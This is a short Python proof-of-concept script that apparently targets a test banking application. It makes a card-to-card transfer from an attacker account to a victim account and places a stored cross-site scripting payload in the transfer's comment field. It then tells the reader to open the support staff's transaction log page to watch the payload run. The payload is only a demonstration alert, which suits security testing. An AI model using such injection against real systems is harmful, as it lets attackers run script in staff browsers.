#! /usr/bin/env python3

from const import *

# Simple script for demonstration.
script = "<script>alert('ATTACK!')</script>"

victim = User("victim3", "12345678")
attacker = User("attacker3", "12345678")

# The transfer flow is attacker -> victim.
dst = victim.cardregister()["card_number"]
src = attacker.cardregister()["card_number"]

# Execute the attack.
attacker.transfer(src, dst, "1", script)

print("""
Now open a browser, log in as support and go to
{}/card2card/getransactionlogs to check out the
attack.
""".format(url))